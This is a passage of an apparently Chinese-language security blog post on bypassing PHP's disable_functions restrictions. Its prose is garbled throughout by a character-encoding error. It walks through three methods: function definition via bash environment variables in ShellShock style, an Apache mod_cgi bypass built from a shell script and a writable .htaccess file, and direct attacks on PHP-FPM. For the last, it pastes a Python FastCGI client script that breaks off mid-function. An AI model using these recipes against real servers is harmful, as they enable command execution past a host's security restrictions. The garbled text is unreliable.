ä¸ºBashçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒå…è®¸åœ¨Bashçš„shellä¸­ä½¿ç”¨ç¯å¢ƒå˜é‡æ¥å®šä¹‰å‡½æ•°ã€‚<br>å‡½æ•°çš„ä½œç”¨æ˜¯æŠŠç»å¸¸è°ƒç”¨çš„ä»£ç å°è£…èµ·æ¥ï¼Œç„¶ååœ¨å…¶ä»–åœ°æ–¹è°ƒç”¨ï¼Œæ‰€æœ‰çš„å¤§å¤šæ•°è„šæœ¬è¯­è¨€éƒ½æœ‰è¿™ä¸ªåŠŸèƒ½ã€‚<br>Bashä¸­å‡½æ•°çš„å®šä¹‰æ˜¯è¿™æ ·çš„:</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">function ShellShock&#123;<br>   echo hello<br>&#125;<br>hello   #è°ƒç”¨è¿™ä¸ªå‡½æ•°<br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯ï¼ŒBashè¿˜æœ‰ä¸€ç§ä½¿ç”¨ç¯å¢ƒå˜é‡æ¥å®šä¹‰å‡½æ•°çš„æ–¹æ³•ï¼Œè¿™æ˜¯å®ƒçš„ç‰¹æ€§ã€‚</p><p>å¦‚æœç¯å¢ƒå˜é‡çš„å€¼ä»¥å­—ç¬¦â€() {â€œå¼€å¤´ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡å°±ä¼šè¢«å½“ä½œæ˜¯ä¸€ä¸ªå¯¼å…¥å‡½æ•°çš„å®šä¹‰ï¼ˆExportï¼‰ï¼Œè¿™ç§å®šä¹‰åªæœ‰åœ¨shellå¯åŠ¨çš„æ—¶å€™æ‰ç”Ÿæ•ˆ.</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">âœ  ~ export ShellShock=&quot;() &#123; echo Hello ShellShock; &#125;&quot;<br>âœ  ~ ShellShock<br>bash:ShellShock: command not found<br>âœ  ~ bash<br>bash-4.1$ ShellShock<br>Hello ShellShock<br>bash-4.1$ <br></code></pre></div></td></tr></table></figure><p>åŸºäºæ­¤å¯ä»¥æ„é€ å¾ˆå¤šå‘½ä»¤ï¼Œå¯å‚è€ƒè¿™ä¸¤ç¯‡æ–‡ç« <br><a href="_url">_link</a><a href="https://www.freesion.com/article/28721177955/">https://www.freesion.com/article/28721177955/</a><br><a href="_url">_link</a><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></p><h2 id="Apache-Mod-CGIç»•è¿‡disable-function"><a href="#Apache-Mod-CGIç»•è¿‡disable-function" class="headerlink" title="Apache Mod CGIç»•è¿‡disable function"></a>Apache Mod CGIç»•è¿‡disable function</h2><blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼šå¯ç”¨mod-cgiï¼Œå…è®¸htaccessæ–‡ä»¶ï¼Œ.htaccesså¯å†™</p></blockquote><h4 id="ç»•è¿‡åŸç†"><a href="#ç»•è¿‡åŸç†" class="headerlink" title="ç»•è¿‡åŸç†"></a>ç»•è¿‡åŸç†</h4><p>apacheæœ‰ä¸€ä¸ªcgiæ¨¡å—ï¼Œè¯¥æ¨¡å—å¯ä»¥è®¾ç½®æŒ‡å®šæ–‡ä»¶ç±»å‹ä»¥cgiæ–¹å¼è®©æœåŠ¡å™¨è¿è¡Œï¼Œä¾‹å¦‚ä¸€ä¸ªä¸å­˜åœ¨çš„afaafaåç¼€æ–‡ä»¶ï¼Œé€šè¿‡è®¾ç½®ï¼Œå°±å¯ä»¥å½“ä½œcgiè¿è¡Œï¼Œå› ä¸ºæ˜¯ç›´æ¥æœåŠ¡å™¨è¿è¡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡phpçš„disable_functionsé™åˆ¶ã€‚</p><p>ä»»ä½•å…·æœ‰MIMEç±»å‹application/x-httpd-cgiæˆ–è€…è¢«cgi-scriptå¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼Œä¸€ç§æ˜¯æ–‡ä»¶å…·æœ‰å·²ç”±AddTypeæŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œå¦ä¸€ç§æ˜¯æ–‡ä»¶ä½äºScriptAliasç›®å½•ä¸­.</p><p>apacheåœ¨é…ç½®cgiåå¯ä»¥ç”¨ScriptAliasæŒ‡ä»¤æŒ‡å®šä¸€ä¸ªç›®å½•,æŒ‡å®šçš„ç›®å½•ä¸‹é¢ä¾¿å­˜æ”¾å¯æ‰§è¡Œçš„cgiç¨‹åº.è‹¥æ˜¯æƒ³è¦å¢åŠ æ–‡ä»¶å¤¹ä¹Ÿå¯æ‰§è¡Œcgiç¨‹åº,åˆ™å¯åœ¨apacheä¸»é…ç½®æ–‡ä»¶ä¸­åšå¦‚ä¸‹è®¾ç½®</p><p>å…ˆåˆ›å»ºä¸€ä¸ª.aæ–‡ä»¶</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">#!/bin/shecho&amp;id<br></code></pre></div></td></tr></table></figure><p>ç„¶åå†å»ºä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œæ„æ€æ˜¯æŠŠ.aæ–‡ä»¶å½“ä½œcgiæ‰§è¡Œã€‚</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">OPtions + ExecCGI<br>AddHandler cgi-script .nbcgi-script .a<br></code></pre></div></td></tr></table></figure><h2 id="æ”»å‡»PHP-FPMç»•è¿‡disable-function"><a href="#æ”»å‡»PHP-FPMç»•è¿‡disable-function" class="headerlink" title="æ”»å‡»PHP_FPMç»•è¿‡disable function"></a>æ”»å‡»PHP_FPMç»•è¿‡disable function</h2><h4 id="PHP-FPMä»‹ç»"><a href="#PHP-FPMä»‹ç»" class="headerlink" title="PHP_FPMä»‹ç»"></a>PHP_FPMä»‹ç»</h4><p>Php-fpmæ˜¯ä»€ä¹ˆ</p><blockquote><p>1ã€cgiã€fast-cgiåè®®<br>cgiçš„å†å²<br>æ—©æœŸçš„webserveråªå¤„ç†htmlç­‰é™æ€æ–‡ä»¶ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œå‡ºç°äº†åƒphpç­‰åŠ¨æ€è¯­è¨€ã€‚webserverå¤„ç†ä¸äº†äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±äº¤ç»™phpè§£é‡Šå™¨æ¥å¤„ç†å§ï¼äº¤ç»™phpè§£é‡Šå™¨å¤„ç†å¾ˆå¥½ï¼Œä½†æ˜¯ï¼Œphpè§£é‡Šå™¨å¦‚ä½•ä¸webserverè¿›è¡Œé€šä¿¡å‘¢ï¼Ÿä¸ºäº†è§£å†³ä¸åŒçš„è¯­è¨€è§£é‡Šå™¨(å¦‚phpã€pythonè§£é‡Šå™¨)ä¸webserverçš„é€šä¿¡ï¼Œäºæ˜¯å‡ºç°äº†cgiåè®®ã€‚åªè¦ä½ æŒ‰ç…§cgiåè®®å»ç¼–å†™ç¨‹åºï¼Œå°±èƒ½å®ç°è¯­è¨€è§£é‡Šå™¨ä¸webwerverçš„é€šä¿¡ã€‚å¦‚php-cgiç¨‹åº</p></blockquote><p>fast-cgiçš„æ”¹è¿›</p><blockquote><p>æœ‰äº†cgiåè®®ï¼Œè§£å†³äº†phpè§£é‡Šå™¨ä¸webserveré€šä¿¡çš„é—®é¢˜ï¼Œwebserverç»ˆäºå¯ä»¥å¤„ç†åŠ¨æ€è¯­è¨€äº†ã€‚ä½†æ˜¯ï¼Œwebserveræ¯æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šå»forkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œè¯·æ±‚ç»“æŸå†killæ‰è¿™ä¸ªè¿›ç¨‹ã€‚è¿™æ ·æœ‰10000ä¸ªè¯·æ±‚ï¼Œå°±éœ€è¦forkã€kill php-cgiè¿›ç¨‹10000æ¬¡ã€‚</p></blockquote><p>äºæ˜¯ï¼Œå‡ºç°äº†cgiçš„æ”¹è‰¯ç‰ˆæœ¬</p><blockquote><p>fast-cgiã€‚fast-cgiæ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åï¼Œä¸ä¼škillæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ä¿ç•™è¿™ä¸ªè¿›ç¨‹ï¼Œä½¿è¿™ä¸ªè¿›ç¨‹å¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·æ¯æ¬¡å°±ä¸ç”¨é‡æ–°forkä¸€ä¸ªè¿›ç¨‹äº†ï¼Œå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p></blockquote><p>æ‰€ä»¥</p><blockquote><p>php-fpmå³php-Fastcgi Process Manager.php-fpmæ˜¯ FastCGI çš„å®ç°ï¼Œå¹¶æä¾›äº†è¿›ç¨‹ç®¡ç†çš„åŠŸèƒ½ã€‚è¿›ç¨‹åŒ…å« master è¿›ç¨‹å’Œ worker è¿›ç¨‹ä¸¤ç§è¿›ç¨‹ã€‚master è¿›ç¨‹åªæœ‰ä¸€ä¸ªï¼Œè´Ÿè´£ç›‘å¬ç«¯å£ï¼Œæ¥æ”¶æ¥è‡ª Web Server çš„è¯·æ±‚ï¼Œè€Œ worker è¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ª(å…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®)ï¼Œæ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ª PHP è§£é‡Šå™¨ï¼Œæ˜¯ PHP ä»£ç çœŸæ­£æ‰§è¡Œçš„åœ°æ–¹ã€‚</p></blockquote><p>å·¥ä½œæµç¨‹å¦‚å›¾<br><img src="https://img-blog.csdnimg.cn/20210518122607155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="æ”»å‡»PHP-FPMçš„åŸç†"><a href="#æ”»å‡»PHP-FPMçš„åŸç†" class="headerlink" title="æ”»å‡»PHP-FPMçš„åŸç†"></a>æ”»å‡»PHP-FPMçš„åŸç†</h4><p>åŸºæœ¬åŸç†å°±æ˜¯æ¨¡ä»¿nginxçš„fast-cgiï¼Œç›´æ¥ä¸php-fpmè¿›è¡Œé€šä¿¡ã€‚<br><img src="https://img-blog.csdnimg.cn/20210518123521695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>requestId:å ä¿©ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚æ—¶çš„å½±å“ã€‚ </li><li>contentLength:å 2ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„é•¿åº¦ã€‚è¯­è¨€ç«¯è§£æäº†fastcgiå¤´ä»¥åï¼Œæ‹¿åˆ°contentLengthï¼Œç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLengthçš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“ã€‚ </li><li>paddingLength:å¡«å……é•¿åº¦çš„å€¼ï¼Œä¸ºäº†æé«˜å¤„ç†æ¶ˆæ¯çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬çš„æ¯ä¸ªæ¶ˆæ¯å¤§å°éƒ½å¿…é¡»ä¸º8çš„å€æ•°ï¼Œæ­¤é•¿åº¦æ ‡ç¤ºï¼Œæˆ‘ä»¬åœ¨æ¶ˆæ¯çš„å°¾éƒ¨å¡«å……çš„é•¿åº¦ </li><li>reserved:ä¿ç•™å­—æ®µ</li></ul><p>è´´ä¸€ä¸‹å¤§ä½¬å¾—è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastCGIClient</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># ç‰ˆæœ¬å·ï¼Œä¸é‡è¦</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># FastCGIæœåŠ¡å™¨è§’è‰²åŠå…¶è®¾ç½®</span><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    <span class="hljs-comment"># # type è®°å½•ç±»å‹1-11</span><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    <span class="hljs-comment"># å¤´éƒ¨é•¿åº¦ï¼Œé»˜è®¤ä¸º8</span><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># è‡ªå®šä¹‰è¯·æ±‚çŠ¶æ€</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):</span><br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># æ­¤å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªsocketï¼Œå¹¶ä¸”å»è¿æ¥(self.host, self.port)</span><br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):</span><br>        <span class="hljs-comment"># æ­¤å‡½æ•°æ ¹æ®fcgi_typeå¯¹contentè¿›è¡Œå°è£…</span><br>        length = <span class="hljs-built_in">len</span>(content)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_VERSION) \<br>               + <span class="hljs-built_in">chr</span>(fcgi_type) \<br>               + <span class="hljs-built_in">chr</span>((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + content<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):</span><br>        <span class="hljs-comment"># æ­¤å‡½æ•°å¯¹bodyè¿›è¡Œç¼–ç </span><br>        nLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(name))<br>        vLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(value))<br>        record = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + <span class="hljs-built_in">str</span>(name) + <span class="hljs-built_in">str</span>(value)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):</span><br>        <span class="hljs-comment"># æ­¤å‡½æ•°å¯¹headerè¿›è¡Œè§£ç </span><br>        <span class="hljs-comment"># è¢«ç”¨äº__decodeFastCGIRecordå‡½æ•°çš„ä¸€éƒ¨åˆ†</span><br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIRecord</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># æ­¤å‡½æ•°å¯¹recordè¿›è¡Œè§£ç </span><br>        header = self.sock.recv(<span class="hljs-built_in">int</span>(FastCGIClient.__FCGI_HEADER_SIZE))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                buffer = self.sock.recv(contentLength)<br>                <span class="hljs-keyword">while</span> contentLength <span class="hljs-keyword">and</span> buffer:<br>                    contentLength -= <span class="hljs-built_in">len</span>(buffer)<br>                    record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = self.sock.recv(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># åŒºåˆ†å¤šæ®µRecord.requestIdä½œä¸ºåŒä¸€æ¬¡è¯·æ±‚çš„æ ‡å¿—</span><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># æ„é€ header</span><br>        beginFCGIRecordContent = <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>                                 + <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + <span class="hljs-built_in">chr</span>(self.keepalive) \<br>                                 + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br><br>        <span class="hljs-comment"># æ„é€ body</span><br>        paramsRecord = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.iteritems():<br>                <span class="hljs-comment"># paramsRecord = self.__encodeNameValueParams(name, value)</span><br>                <span class="hljs-comment"># request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += 